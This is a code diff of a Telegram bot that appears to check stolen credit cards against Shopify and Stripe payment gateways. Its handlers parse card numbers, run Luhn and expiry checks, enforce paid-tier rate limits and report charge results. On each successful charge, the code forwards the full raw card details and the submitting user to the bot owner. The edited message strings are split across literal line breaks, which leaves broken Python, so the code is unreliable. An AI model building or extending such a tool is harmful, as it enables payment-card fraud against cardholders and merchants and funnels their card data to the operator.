@@ -32,39 +32,39 @@ async def single_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     conn = ctx.bot_data["db"]
 
     if is_banned(conn, user.id):
-        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
         return
 
     # Rate limit: command cooldown
     allowed, remaining = rate_limiter.check_command_cooldown(user.id, "sh")
     if not allowed:
-        await update.message.reply_text(get_cooldown_message("/sh", remaining))
+        await update.effective_message.reply_text(get_cooldown_message("/sh", remaining))
         return
 
     # Parse card from command args or reply
     raw_card = None
     if ctx.args:
         raw_card = " ".join(ctx.args)
-    elif update.message.reply_to_message:
-        raw_card = update.message.reply_to_message.text
+    elif update.effective_message.reply_to_message:
+        raw_card = update.effective_message.reply_to_message.text
 
     if not raw_card:
-        await update.message.reply_text(format_usage_sh(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_usage_sh(), parse_mode=ParseMode.HTML)
         return
 
     card = parse_card(raw_card)
     if not card:
-        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
         return
 
     # Validate Luhn
     if not luhn_valid(card.number):
-        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
         return
 
     # Check expiry
     if is_expired(card.month, card.year):
-        await update.message.reply_text(format_error("Card is expired."), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_error("Card is expired."), parse_mode=ParseMode.HTML)
         return
 
     # Rate limit: hourly check limit
@@ -72,17 +72,17 @@ async def single_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     tier = get_user_tier(conn, user.id)
     hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, 1)
     if not hourly_ok:
-        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
+        await update.effective_message.reply_text(get_hourly_message(tier, hourly_remaining))
         return
 
     # Card repeat detection (same card in 5 min)
     if rate_limiter.is_card_repeat(user.id, card.number, window=300):
         rate_limiter.refund_hourly(user.id)
-        await update.message.reply_text(format_error("You already checked this card recently."))
+        await update.effective_message.reply_text(format_error("You already checked this card recently."))
         return
 
     # Send "checking..." message
-    checking_msg = await update.message.reply_text(
+    checking_msg = await update.effective_message.reply_text(
         format_checking(card), parse_mode=ParseMode.HTML
     )
 
@@ -176,19 +176,30 @@ async def single_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         # Forward to owner (Phase 5 feature)
         try:
+            import html
             owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
             await safe_send(
                 ctx.bot,
                 chat_id=owner_id,
                 text=(
-                    f"🤍 CHARGED CARD DETECTED 🤍\n\n"
-                    f"💳 CC : {card.raw}\n"
-                    f"🛒 Gateway : {result.gateway}\n"
-                    f"📝 Response : {result.message}\n"
-                    f"💵 Price : ${result.price}\n"
-                    f"🏪 Store : {result.store}\n"
-                    f"👤 User : {user.id} ({user.username})\n\n"
-                    f"💳 BIN: {card.bin}\n"
+                    f"🤍 CHARGED (Single) 🤍
+
+"
+                    f"💳 CC : {html.escape(card.raw)}
+"
+                    f"🛒 Gateway : {html.escape(result.gateway)}
+"
+                    f"📝 Response : {html.escape(result.message)}
+"
+                    f"💵 Price : ${result.price}
+"
+                    f"🏪 Store : {html.escape(result.store)}
+"
+                    f"👤 User : {user.id} ({html.escape(user.username or '')})
+
+"
+                    f"💳 BIN: {card.bin}
+"
                     f"━━━━━━━━━━━━━━━━━━━━━━"
                 ),
                 parse_mode=ParseMode.HTML,
@@ -207,11 +218,11 @@ async def stripe_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     conn = ctx.bot_data["db"]
 
     if is_banned(conn, user.id):
-        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
         return
 
     from templates.messages import format_error
-    await update.message.reply_text(
+    await update.effective_message.reply_text(
         format_error("Stripe check is currently disabled.\nUse <code>/sh</code> for Shopify checks instead."),
         parse_mode=ParseMode.HTML,
     )
@@ -220,31 +231,31 @@ async def stripe_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     # Rate limit: command cooldown
     allowed, remaining = rate_limiter.check_command_cooldown(user.id, "st")
     if not allowed:
-        await update.message.reply_text(get_cooldown_message("/st", remaining))
+        await update.effective_message.reply_text(get_cooldown_message("/st", remaining))
         return
 
     # Parse card from command args or reply
     raw_card = None
     if ctx.args:
         raw_card = " ".join(ctx.args)
-    elif update.message.reply_to_message:
-        raw_card = update.message.reply_to_message.text
+    elif update.effective_message.reply_to_message:
+        raw_card = update.effective_message.reply_to_message.text
 
     if not raw_card:
-        await update.message.reply_text(format_usage_st(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_usage_st(), parse_mode=ParseMode.HTML)
         return
 
     card = parse_card(raw_card)
     if not card:
-        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
         return
 
     if not luhn_valid(card.number):
-        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
         return
 
     if is_expired(card.month, card.year):
-        await update.message.reply_text(format_error("Card is expired."), parse_mode=ParseMode.HTML)
+        await update.effective_message.reply_text(format_error("Card is expired."), parse_mode=ParseMode.HTML)
         return
 
     # Rate limit: hourly check limit
@@ -252,17 +263,17 @@ async def stripe_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     tier = get_user_tier(conn, user.id)
     hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, 1)
     if not hourly_ok:
-        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
+        await update.effective_message.reply_text(get_hourly_message(tier, hourly_remaining))
         return
 
     # Card repeat detection
     if rate_limiter.is_card_repeat(user.id, card.number, window=300):
         rate_limiter.refund_hourly(user.id)
-        await update.message.reply_text(format_error("You already checked this card recently."))
+        await update.effective_message.reply_text(format_error("You already checked this card recently."))
         return
 
     # Send "checking..." message
-    checking_msg = await update.message.reply_text(
+    checking_msg = await update.effective_message.reply_text(
         format_checking(card), parse_mode=ParseMode.HTML
     )
 
